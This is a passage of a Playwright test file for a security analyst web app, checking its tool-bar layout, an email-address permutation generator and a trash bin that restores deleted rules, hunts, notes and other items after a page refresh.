  expect(R.corp).toEqual(['jordan.okafor@corp.example', 'jokafor@corp.example', 'jordan@corp.example', 'jordanokafor@corp.example', 'jordan.okafor@corp.co.uk', 'jokafor@corp.co.uk', 'jordan@corp.co.uk', 'jordanokafor@corp.co.uk']);
  // on screen: every tool tab visible without scrolling, at laptop and small-desktop widths
  // the tool bar is one line at laptop and desktop widths; every tool is one click into its group
  for(const w of [1024, 1280, 1440]){ await page.setViewportSize({ width: w, height: 800 }); await page.evaluate(() => { UI.labTab = 'gen'; go('#/lab'); });
    const rows = await page.evaluate(() => new Set([...document.querySelectorAll('.lt-cat')].map(b => Math.round(b.getBoundingClientRect().top))).size);
    expect(rows, 'width ' + w).toBe(1); await expect(page.locator('.lt-c.on .lt-cur')).toHaveText('Generators'); }
  expect(await page.locator('.lt-pop [data-act=labTab]').count()).toBe(13);
  await page.click('.lt-cat[data-v="0"]'); await expect(page.locator('.lt-pop').first()).toBeVisible(); await page.click('.lt-pop [data-v=pcap]');
  await expect(page.locator('.lt-c.on .lt-cur')).toHaveText('PCAP'); await expect(page.locator('.lt-pop').first()).toBeHidden();
  await page.click('.lt-cat[data-v="2"]'); await page.keyboard.press('Escape'); await expect(page.locator('.lt-pop').nth(2)).toBeHidden();
  await page.click('.lt-cat[data-v="2"]'); await page.click('.lt-pop [data-v=gen]');
  await page.fill('#genName', 'Jordan Okafor'); await page.fill('#genDom', 'corp.example');
  const first = page.locator('.gen-s').first().locator('.gen-i').first();
  await expect(first.locator('code')).toHaveText('jordanokafor');
  await first.hover(); await first.locator('[data-act=flagCopy]').click();
  await page.fill('#genQ', 'j.'); await expect(page.locator('.gen-s').first().locator('.gen-i code').first()).toHaveText('j.okafor');
  await page.fill('#genQ', ''); await page.click('[data-act=genSep][data-v="."]');
  await expect(page.locator('.gen-s').first()).not.toContainText('jordan.okafor');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('.gen-s', { hasText: 'Work email' }).locator('[data-act=genSave]').click()]);
  expect(dl.suggestedFilename()).toBe('jordan-okafor-work-email.txt');
  noErrors(errors);
});

// hardening: trash, saving, hostile input, parsers
test('trash: always in the sidebar; deleting a rule, saved query, hunt, playbook, tool, automation, note, record and vault entry puts each there, and each comes back — also after a refresh', async ({ page }) => {
  const errors = await open(page, '#/home');
  await expect(page.locator('.nav [data-nav=trash], nav a[href="#/trash"]').first()).toBeVisible();
  const before = await page.evaluate(() => {
    DB.trash = []; const r0 = DB.rules.find(r => !r.builtin) || DB.rules[0], q0 = (DB.queries || [])[0], pb = DB.playbooks[0], t0 = DB.tools[0];
    DB.hunts = [{ id: 'h-tr', name: 'C2 again', kind: 'query', q: '203.0.113.47', seen: [], created: Date.now() }]; DB.autos = DB.autos || []; DB.autos.push({ id: 'au-tr', name: 'Tag phish', on: true, when: {}, then: [], scope: 'all', runs: 0, made: Date.now() });
    mutate('setup'); return { rule: r0.id, query: q0 && q0.id, pb: pb.id, tool: t0.id, note: DB.notes[0].id, rec: DB.records.find(r => r.type !== 'lead').id, ent: DB.entries[0].id, counts: { rules: DB.rules.length, tools: DB.tools.length, pbs: DB.playbooks.length, notes: DB.notes.length, recs: DB.records.length, ents: DB.entries.length } }; });
  await page.evaluate(async b => { const dismiss = () => { const y = document.querySelector('#dlg [data-act=confirmOk]'); if(y) y.click(); };
    clickAct('rDel', b.rule); if(b.query) clickAct('qDel', b.query); HU_ACTS.huDel('h-tr'); AU_ACTS.auDel('au-tr'); clickAct('toolDel', b.tool); clickAct('nDel', b.note); delRecord(b.rec); clickAct('delEntry', b.ent);
    clickAct('pbDelAsk', b.pb); await new Promise(r => setTimeout(r, 50)); dismiss(); }, before);
  const kinds = await page.evaluate(() => DB.trash.map(x => x.kind).sort());
  expect(kinds).toEqual(['auto', 'entry', 'hunt', 'note', 'playbook', 'query', 'record', 'rule', 'tool'].filter(k => k !== 'query' || before.query));
  await expect.poll(() => page.evaluate(() => { flush(); return isDirty(); }), { timeout: 15000 }).toBe(false); await page.reload();
  await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && !!DB && !!document.querySelector('#sidenav .nv') && Array.isArray(DB.trash) ? DB.trash.length : -1), { timeout: 15000 }).toBe(kinds.length);   // the trash survives a refresh                               // the trash survives a refresh
  await page.evaluate(() => go('#/trash'));
  await expect(page.locator('.binrow')).toHaveCount(kinds.length);
  for(let i = 0; i < kinds.length; i++) await page.locator('.binrow [data-act=trRestore]').first().click();
  const after = await page.evaluate(() => ({ rules: DB.rules.length, tools: DB.tools.length, pbs: DB.playbooks.length, notes: DB.notes.length, recs: DB.records.length, ents: DB.entries.length, hunt: DB.hunts.some(h => h.id === 'h-tr'), auto: DB.autos.some(a => a.id === 'au-tr'), trash: DB.trash.length }));
  expect(after).toEqual({ ...before.counts, hunt: true, auto: true, trash: 0 });
  noErrors(errors);
});
